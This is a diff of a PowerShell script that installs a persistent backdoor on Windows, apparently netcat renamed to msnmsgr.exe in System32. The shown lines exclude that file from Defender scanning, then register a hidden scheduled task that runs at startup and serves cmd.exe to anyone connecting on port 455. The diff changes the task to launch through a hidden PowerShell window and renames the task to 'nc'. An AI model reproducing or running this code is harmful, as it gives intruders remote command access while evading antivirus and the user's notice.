@@ -51,11 +51,12 @@ if (Test-Path "$system32Path\nc.exe") {
 Write-Host "4/10: Setting up System Startup..."
 Add-MpPreference -ExclusionPath "C:\Windows\System32\msnmsgr.exe"
 
-$Action = New-ScheduledTaskAction -Execute 'C:\Windows\System32\msnmsgr.exe' -Argument '-l -p 455 -e cmd.exe' -WorkingDirectory 'C:\Windows\System32' -NoNewWindow
+$Action = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-WindowStyle Hidden -Command ""Start-Process 'C:\Windows\System32\msnmsgr.exe' -ArgumentList '-Ldp 455 -e cmd.exe' -NoNewWindow"""
 $Trigger = New-ScheduledTaskTrigger -AtStartup
 $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -DontStopOnIdleEnd -StartWhenAvailable
 $Task = New-ScheduledTask -Action $Action -Trigger $Trigger -Settings $Settings
-Register-ScheduledTask -TaskName "NombreDeTuTarea" -InputObject $Task
+Register-ScheduledTask -TaskName "nc" -InputObject $Task
+
 
 
 # 5/10: Adding Firewall Rule
